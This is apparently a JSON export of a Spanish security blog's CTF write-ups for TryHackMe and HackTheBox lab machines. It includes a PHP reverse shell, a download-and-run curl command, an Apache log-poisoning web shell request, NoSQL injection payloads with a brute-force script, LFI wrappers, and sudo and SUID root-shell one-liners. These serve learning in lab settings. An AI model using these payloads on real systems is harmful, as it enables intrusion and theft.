  HTTP Puerto 8080 Encontramos Apache Tompact en el puerto 8080.\nAJP - Ghostcat File Read/Inclusion Para el servicio en el puerto 8009 (Apache Jserv) encontramos un exploit que permite lectura de archivos, utilizamos el exploit CVE-2020-1938. Intentamos leer el archivo index.jsp y logramos obtener el codigo fuente.\nYa que logramos obtener el codigo fuente de index.jsp, intentamos obtener el archivo de configuracion web.xml, logramos obtener el codigo fuente y logramos ver lo que parecen credenciales.\nUSER - SKYFUCK Intentamos ingresar en el panel de tomcat (/manager/html) pero no esta autorizado el acceso. Utilizamos el servicio SSH con las credenciales encontradas y logramos obtener una shell.\nDentro de la carpeta principal de Skyfuck encontramos dos arhivos una clave y un archivo encriptado, intentamos importar la key y desencriptar el archivo gpg pero al parecer la clave esta protegida por una frase.\nUtilizamos gpg2john para generar el hash y utilizar john para encontrar la frase.\nUna vez encontrada la frase utilizamos esta para desencriptar el archivo credentials.gpg.\nUSER - MERLIN Utilizamos las credenciales encontradas y obtenemos una shell con el usuario merlin y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando zip. Utilizamos zip para obtener una shell root.\nLogramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"TomGhost es una maquina de TryHackMe. Identificamos una vulnerabilidad en Tomcat para leer las credenciales de esta misma plataforma, lo que nos permitio acceder por SSH donde luego encontramos un archivo encriptado y, que, con la ayuda de John obtuvimos la contraseña para un segundo usuario. Escalamos privilegios utilizando Sudo con Zp e informacion de GTFOBins.","id":88,"section":"posts","tags":["Ghostcat"],"title":"TryHackMe - TomGhost","uri":"https://sckull.github.io/posts/tomgost/"},{"content":"  OpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa. Accedimos al siguiente usuario con contraseñas almacenadas. Tras analizar el codigo fuente de una pagina, ejecutamos un Tunnel para obtener esta localmente y finalmente obtener una clave privada para acceder a otro usuario por SSH. Escalamos privilegios utilizando Nano e informacion de GTFOBins.\nInformacion de la Maquina    Nombre OpenAdmin      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.171   Maker del_KZx497Ju    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.8, 5.1, 7.1, 2.9, 4.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-08 05:54:56 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.171 Discovered open port 80/tcp on 10.10.10.171 # Nmap 7.80 scan initiated Tue Jan 7 23:51:39 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.171 Warning: 10.10.10.171 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.171 Host is up (0.15s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 16874/tcp filtered unknown 31545/tcp filtered unknown 40838/tcp filtered unknown 42307/tcp filtered unknown 47055/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds   HTTP Pagina por default de Apache.\nGOBUSTER - HTTP Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5 6  root@aoiri:~/htb/openadmin# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 115 -x php,html,txt -q /index.html (Status: 200) /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) /marga (Status: 301)   /music /sierra /marga /artwork OpenNetAdmin 18.1.1 - RCE En la pagina de /music encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version 18.1.1.\nEste gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (OpenNetAdmi - ExploitDB ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.\nUSER - Jimmy Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.\n1  \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.72/1227 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);   Descargamos en la maquina:\n1  wget 10.10.15.72/sc.php   Obtenemos nuestra shell inversa:\nEntre los archivos de configuracion de la base de datos de OpenNetAdmin encontramos las credenciales para acceder a la base de datos, utilizamos la contraseña para obtener una shell con el usuario Jimmy.\nJimmy:\nCredenciales:\njimmy:n1nj4W4rri0R! USER - Joanna Dentro de la carpeta /var/www/ donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.\nCambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta /home y /var/www.\nEn la carpeta principal de Jimmy encontramos un archivo PHP - post.php el cual hace una solicitud con curl (en PHP) enviando un usuario y contraseña y obtiene el resultado de la solicitud.\nAl ejecutarlo nos muestra un error:\nPero la solicitud la hace hacia el localhost de la maquina en un puerto que no es publico.\nEn /var/www/internal, vemos que en archivo index.php existe una contraseña encriptada.\nCon la ayuda de crackstation logramos obtener en texto plano la contraseña:\nCredenciales:\njimmy:Revealed Ahora que conocemos todo esto, traemos localmente el puerto 52846 utilizando SSH, visitamos la pagina y nos muestra un panel de logeo.\nSSH:\n1  ssh -L 8080:localhost:52846 jimmy@10.10.10.171   Netstat:\nPanel:\nIngresamos las credenciales que obtuvimos en el archivo index, y nos muestra una clave privada de SSH encryptada.\nUtilizamos john the ripper para crackear la frase e iniciar sesion con la clave privada.\nFrase:bloodninjas SSH Joanna:\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de GTFOBbins - nano obtenemos una shell commo root y con ello nuestra flag root.txt.\nBTW Podemos agregar nuestra clave publica al archivo authorized_keys del usuario root e iniciar sesion con nuestra clave privada.\n","description":"OpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa. Accedimos al siguiente usuario con contraseñas almacenadas. Tras analizar el codigo fuente de una pagina, ejecutamos un Tunnel para obtener esta localmente y finalmente obtener una clave privada para acceder a otro usuario por SSH. Escalamos privilegios utilizando Nano e informacion de GTFOBins.","id":89,"section":"posts","tags":["OpenNetAdmin","nano"],"title":"Hack The Box - OpenAdmin","uri":"https://sckull.github.io/posts/openadmin/"},{"content":"  Descubrimos un subdominio tras ejecutar SSLScan lo que nos llevo a una vulnerabilidad de Inyeccion NoSQL en donde obtuvimos credenciales que utilizamos en el servicio SSH. Enumeramos los ficheros SUID donde encontramos jjs de java que aprovechamos para escalar privilegios.\nInformacion de la Maquina    Nombre Mango      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.162   Maker MrR3boot    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.4, 7.2, 5.2, 4.8, 2.8], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 9, 4, 6, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  root@aoiri:~/htb/mango# masscan -p1-65535,U:1-65535 10.10.10.162 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-31 00:09:30 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.162 Discovered open port 22/tcp on 10.10.10.162 # Nmap 7.80 scan initiated Mon Dec 30 17:45:13 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.162 Warning: 10.10.10.162 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.162 Host is up (0.34s latency). Not shown: 65531 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 45463/tcp filtered unknown # Nmap done at Mon Dec 30 17:46:57 2019 -- 1 IP address (1 host up) scanned in 103.79 seconds # Nmap 7.80 scan initiated Mon Dec 30 18:09:24 2019 as: nmap -sV -sC -p22,80,443,45436 -o nmap_scan_sc 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 45436/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 30 18:09:56 2019 -- 1 IP address (1 host up) scanned in 32.05 seconds   HTTP Al visitar el puerto 80 nos muestra que no tenemos permisos para ver el contenido.\nGOBUSTER Busqueda de directorios y archivos con gobuster.\n1 2  root@aoiri:~/htb/mango# gobuster dir -u http://10.10.10.162/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -q -x php,html,txt /server-status (Status: 403)   HTTPS En el puerto 443, nos muestra una pagina tipo buscador.\nGOBUSTER - HTTPS Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5  root@aoiri:~/htb/mango# gobuster dir -u https://10.10.10.162/ -w /usr/share/wordlists/dirb/common.txt -t 35 -q -x php,html,txt -k /analytics.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403)   /analytics.php Encontramos una pagina con una funcionalidad de tabla de \u0026lsquo;excel\u0026rsquo;.\nSSLSCAN Utilizamos sslscan para verificar el certificado de la pagina, encontramos un dominio el cual agregamos a /etc/hosts.\nVisitamos la pagina del dominio nuevo (https) pero nos muestra la misma pagina que la ip en https, pero no muestra lo mismo en http.\nNuevamente ejecutamos gobuster pero no encontramos nada interesante en los directorios.\n1 2 3 4 5 6  root@aoiri:~/htb/mango# gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x txt,html,php -t 15 /home.php (Status: 302) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /vendor (Status: 301)   USER - MongoDB NoSQL Capturamos los datos que se envian al iniciar sesion en el panel intentando encontrar una vulnerabilidad del tipo sql injection, pero ninguno de los parametros era vulnerable. Intentamos con NoSQL Injection dentro de burpsuite:\nParametros:\nusername[$ne]=sckull\u0026amp;password[$ne]=sckull\u0026amp;login=login Inyeccion NoSQL - Burpsuite Utilizamos burpsuite para obtener la contraseña y longitud de ella del usuario mango (asumiendo que mango es un usuario), para conocer la longitud de la contraseña utilizamos el payload, reemplazando el numero 0 por un numero mayor hasta que el resultado de la solicitud sea 200, en el caso del usuario mango la longitud de la contraseña puede ser \u0026gt;= 16 caracteres:\n1  username=mango\u0026amp;password[$regex]=.{16}\u0026amp;login=login   Utilizando el siguiente payload donde el 0 es reemplazado por otro hasta que la respuesta de nuestra solicitud sea Codigo 302 que significa que la expresion regular que le estamos pasando esta haciendo match con la contraseña:\nusername=mango\u0026amp;password[$regex]=^0\u0026amp;login=login Vemos que el inicio de la contraseña es h:\nModificamos nuevamente nuestro parametro en password:\nusername=mango\u0026amp;password[$regex]=^h§0§\u0026amp;login=login Haciendo el mismo procedimiento cada vez que encontremos una solicitud 302, hasta obtener la contraseña completa:\nmango:h3mXK8RhU~f{]f5H Tambien podemos utilizar el script que PayloadAllTheThings tiene en NoSQL Injection, modificando un poco el codigo para adaptarlo a esta maquina quedaria de esta forma:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  import requests import urllib3 import string import urllib urllib3.disable_warnings() #username=\u0026#34;mango\u0026#34; password=\u0026#34;\u0026#34; u=\u0026#34;http://staging-order.mango.htb/index.php\u0026#34; headers = {\u0026#39;application\u0026#39; : \u0026#39;x-www-form-urlencoded\u0026#39;} while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;]: payload={\u0026#39;username[$eq]\u0026#39;:\u0026#39;mango\u0026#39;, \u0026#39;password[$regex]\u0026#39;: \u0026#39;^%s\u0026#39; %(password + c), \u0026#39;login\u0026#39;: \u0026#39;login\u0026#39; } #print payload r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302: #print \u0026#34;For check the payload ...\u0026#34; #print payload  print(\u0026#34;Found one more char : %s\u0026#34; % (password+c)) password += c   Obtuvimos la contraseña del usuario mongo pero no pudimos iniciar sesion en el panel, nos redirige al index, utilizamos las credenciales en el servicio ssh y logramos obtener una shell.\nDentro de los servicios de la maquina encontramos que esta corriendo mongo en el puerto 27017.\nUtilizando la shell de mongo pudimos obtener las credenciales del usuario admin.\nCambiamos de usuario y obtuvimos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los ficheros SUID para tomar ventaja de estos, encontramos que existe en la maquina jjs, utilizamos GTFOBINS para obtener una shell. Modificamos sh por bash, ya que nos da un error al intentar ejecutar comandos.\n1  echo \u0026#34;Java.type(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;/bin/bash -pc \\$@|bash\\${IFS}-p _ echo bash -p \u0026lt;$(tty)\u0026gt;$(tty)2\u0026gt;$(tty)\u0026#39;).waitFor()\u0026#34; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs   Obtuvimos nuestra shell con privilegios root y nuestra flag root.txt.\n","description":"Descubrimos un subdominio tras ejecutar SSLScan lo que nos llevo a una vulnerabilidad de Inyeccion NoSQL en donde obtuvimos credenciales que utilizamos en el servicio SSH. Enumeramos los ficheros SUID donde encontramos jjs de java que aprovechamos para escalar privilegios.","id":90,"section":"posts","tags":["noSQL","sslscan","suid"],"title":"Hack The Box - Mango","uri":"https://sckull.github.io/posts/mango/"},{"content":"  DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.\nRoom    Titulo dogcat      Descripción I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.   Puntos 435   Dificultad Media   Maker jammy     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Nmap 7.80 scan initiated Fri Apr 17 20:42:19 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan dogcat.thm Warning: dogcat.thm giving up on port because retransmission cap hit (2). Nmap scan report for dogcat.thm Host is up (0.15s latency). Not shown: 65497 closed ports, 36 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) |_ 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: dogcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/tools/Kadimus# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 45 -x php,html,txt /index.php (Status: 200) /cat.php (Status: 200) /flag.php (Status: 200) /cats (Status: 301) /dogs (Status: 301) /dog.php (Status: 200)   HTTP Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.\nVemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.\nPor lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.\nLFI - CAT OR DOG Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje Sorry, only dogs or cats are allowed..\nLo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje Here you go! y un error de la funcion include(). Desde aqui tiene un poco de sentido el mensaje de error anterior (Sorry, only dogs or cats are allowed.) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.\nUtilizamos php://filter/convert.base64-encode/dog/resource=ARCHIVO para leer archivos, en este caso leemos el archivo index.php que es el que utiliza ?view=, logramos obtener el archivo en base64.\nLogramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como .php.\n **ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER` 1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt;    Leemos el archivo flag.php y logramos leer nuestra primera flag.\nRCE - Apache Log Poisoning Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext= para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina \u0026amp;cmd=whoami, por lo que luciría de la siguiente forma.\nApache Log Poisoning\n1 2 3  GET /?view=php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext=\u0026amp;cmd=whoami HTTP/1.1 Host: dogcat.thm User-Agent:Mozilla/5.0 \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Gecko/20100101 Firefox/68.0   Vemos que en la respuesta tenemos acceso como usuario www-data.\nUSER - WWW-DATA [ DOCKER ] Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.\nComando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)\n1 2 3 4  bash -c \u0026#34;$(curl -s 10.8.6.160/shell.sh)\u0026#34; #Codificado bash%20-c%20%20\u0026#34;$(curl%20-s%2010.8.6.160/shell.sh)\u0026#34;   Logramos obtener una shell con el usuario www-data.\nNuestra segunda flag.\nPRIVILEGE ESCALATION - DOCKER Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando env. Utilizamos env para obtener una shell root.\n1  sudo /usr/bin/env /bin/sh   Òbtenemos nuestra shell como usuario root y nuestra tercera flag.\nESCAPING DOCKER Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo .dockerenv por lo que en el lugar que estamos es un contenedor.\nDentro de la carpeta /opt/backup encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.\nTCPDUMP\nPodemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.\nSHELL\nNETCAT\nLogramos obtener una shell y nuestra ultima flag.\nCrontab del archivo backup.sh\n","description":"DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.","id":91,"section":"posts","tags":["lfi","cron","docker","lfi poisoning","wrappers"],"title":"TryHackMe - DogCat","uri":"https://sckull.github.io/posts/dogcat/"},{"content":"  Tony the Tiger es una maquina de TryHackMe, explotamos una vulnerabilidad en JBoss con JexBoss Tool para acceder a la maquina. Accedimos con un segundo usuario utilizando contraseñas almacenadas. Finalmente escalamos privilegios utilizando Find e informacion de GTFOBins.\nRoom    Titulo Tony the Tiger      Descripción Learn how to use a Java Serialisation attack in this boot-to-root   Puntos 240   Dificultad Facil   Maker cmnatic     NMAP Escaneo de puertos tcp, escaneo con nmap muestra el puerto http (80), http (8080), el puerto ssh (22) abiertos, entre otros puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123  # Nmap 7.80 scan initiated Fri Apr 17 19:53:10 2020 as: nmap -sV -sC -o nmap_scan 10.10.91.15 Nmap scan report for 10.10.91.15 Host is up (0.20s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA) | 2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA) | 256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA) |_ 256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-generator: Hugo 0.66.0 |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Tony\u0026amp;#39;s Blog 1090/tcp open java-rmi Java RMI |_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug) 1091/tcp open java-rmi Java RMI 1098/tcp open java-rmi Java RMI 1099/tcp open java-object Java Object Serialization | fingerprint-strings: | NULL: | java.rmi.MarshalledObject| | hash[ | locBytest | objBytesq | #http://thm-java-deserial.home:8083/q | org.jnp.server.NamingServer_Stub | java.rmi.server.RemoteStub | java.rmi.server.RemoteObject | xpwA | UnicastRef2 |_ thm-java-deserial.home 4446/tcp open java-object Java Object Serialization 5500/tcp open hotline? | fingerprint-strings: | DNSStatusRequestTCP: | DIGEST-MD5 | NTLM | GSSAPI | CRAM-MD5 | thm-java-deserial | DNSVersionBindReqTCP: | DIGEST-MD5 | NTLM | CRAM-MD5 | GSSAPI | thm-java-deserial | GenericLines, NULL: | CRAM-MD5 | DIGEST-MD5 | GSSAPI | NTLM | thm-java-deserial | GetRequest: | NTLM | GSSAPI | DIGEST-MD5 | CRAM-MD5 | thm-java-deserial | HTTPOptions, TLSSessionReq: | DIGEST-MD5 | CRAM-MD5 | NTLM | GSSAPI | thm-java-deserial | Help: | NTLM | GSSAPI | CRAM-MD5 | DIGEST-MD5 | thm-java-deserial | Kerberos: | CRAM-MD5 | DIGEST-MD5 | NTLM | GSSAPI | thm-java-deserial | RPCCheck: | DIGEST-MD5 | CRAM-MD5 | GSSAPI | NTLM | thm-java-deserial | RTSPRequest: | CRAM-MD5 | GSSAPI | DIGEST-MD5 | NTLM | thm-java-deserial | SSLSessionReq: | GSSAPI | CRAM-MD5 | NTLM | DIGEST-MD5 | thm-java-deserial | TerminalServerCookie: | CRAM-MD5 | GSSAPI | NTLM | DIGEST-MD5 |_ thm-java-deserial 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: | Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS | Potentially risky methods: PUT DELETE TRACE |_ See https://nmap.org/nsedoc/scripts/ajp-methods.html 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Potentially risky methods: PUT DELETE TRACE |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache-Coyote/1.1 |_http-title: Welcome to JBoss AS 8083/tcp open http JBoss service httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 3 services unrecognized despite returning data. If you know the service/version, please submit 